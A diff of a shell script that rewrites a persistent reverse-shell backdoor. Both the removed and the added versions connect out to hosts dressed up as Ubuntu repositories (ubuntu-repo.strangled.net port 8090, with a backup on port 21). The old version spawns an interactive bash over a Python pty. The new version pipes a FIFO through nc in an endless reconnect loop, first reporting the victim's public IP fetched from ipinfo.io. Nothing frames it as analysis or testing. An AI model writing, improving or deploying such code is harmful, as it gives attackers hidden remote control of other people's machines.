@@ -1,61 +1,67 @@
-#!/bin/sh
+#!/usr/bin/env bash
 
 LOCKFILE="/tmp/cached_script.lock"
-if [ -f "$LOCKFILE" ] && kill -0 $(cat "$LOCKFILE") 2>/dev/null; then
-    exit 0
+PRIMARY_HOST="ubuntu-repo.strangled.net"
+PRIMARY_PORT=8090
+BACKUP_HOST="linux-x86-tcpudp.strangled.net"
+BACKUP_PORT=21
+
+# 
+check_and_acquire_lock() {
+    if [ -f "$LOCKFILE" ]; then
+        LOCAL_PID=$(cat "$LOCKFILE" 2>/dev/null)
+        if [ -n "$LOCAL_PID" ] && kill -0 "$LOCAL_PID" 2>/dev/null; then
+            # Process is already running safely on the target environment, exit cleanly
+            exit 0
+        fi
+    fi
+    echo $$ > "$LOCKFILE"
+}
+
+remove_lock() {
+    rm -f "$LOCKFILE"
+}
+
+# 
+trap remove_lock EXIT INT TERM
+
+#
+check_and_acquire_lock
+
+# 
+TRUE_IP="Unknown_IP"
+if command -v curl >/dev/null 2>&1; then
+    # 
+    TRUE_IP=$(curl -s -m 4 -A "curl/7.68.0" http://ipinfo.io | grep -o '"ip":[^,]*' | cut -d'"' -f4)
+elif command -v wget >/dev/null 2>&1; then
+    TRUE_IP=$(wget -qO- --timeout=4 --user-agent="curl/7.68.0" http://ipinfo.io | grep -o '"ip":[^,]*' | cut -d'"' -f4)
 fi
-echo $$ > "$LOCKFILE"
-trap 'rm -f "$LOCKFILE"; exit' INT TERM EXIT
 
-python3 -c '
-import socket, os, pty, select, subprocess, time, urllib.request, json
+[ -z "$TRUE_IP" ] && TRUE_IP="Unknown_IP"
 
-# 1. Grab the true public IP directly on the target machine first
-true_ip = "Unknown IP"
-try:
-    with urllib.request.urlopen("http://ipinfo.io", timeout=3) as response:
-        true_ip = json.loads(response.read().decode()).get("ip", "Unknown IP")
-except:
-    pass
+# 
+while true; do
+    # 
+    rm -f /tmp/p
+    mkfifo /tmp/p
 
-while True:
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(("ubuntu-repo.strangled.net", 8090))
-        
+    #
+    if nc -z -w 3 "$PRIMARY_HOST" "$PRIMARY_PORT" >/dev/null 2>&1; then
+        # 
+        (echo -e "$TRUE_IP"; cat /tmp/p) | nc "$PRIMARY_HOST" "$PRIMARY_PORT" >/tmp/p 2>&1 &
+        NC_PID=$!
+    else
+        # 
+        (echo -e "$TRUE_IP"; cat /tmp/p) | nc "$BACKUP_HOST" "$BACKUP_PORT" >/tmp/p 2>&1 &
+        NC_PID=$!
+    fi
 
-        s.send(f"{true_ip}\n".encode())
-        
-        master, slave = os.openpty()
-        p = subprocess.Popen(["/bin/bash", "-i"], stdin=slave, stdout=slave, stderr=slave, preexec_fn=os.setsid)
-        os.close(slave)
+    # 
+    while kill -0 "$NC_PID" >/dev/null 2>&1; do
+        sleep 5
+    done
 
-        while p.poll() is None:
-            r, w, x = select.select([s, master], [], [], 5)
-            if not r:
-                try: s.send(b"\x00")
-                except: break
-                continue
-
-            for fd in r:
-                if fd == s:
-                    data = s.recv(4096)
-                    if not data: break
-                    os.write(master, data)
-                elif fd == master:
-                    data = os.read(master, 4096)
-                    if not data: break
-                    s.send(data)
-            else:
-                continue
-            break
-        try: p.terminate()
-        except: pass
-    except Exception:
-        pass
-    finally:
-        try: s.close()
-        except: pass
-        
-    time.sleep(5)
-'
+    # 
+    rm -f /tmp/p
+    sleep 5
+done
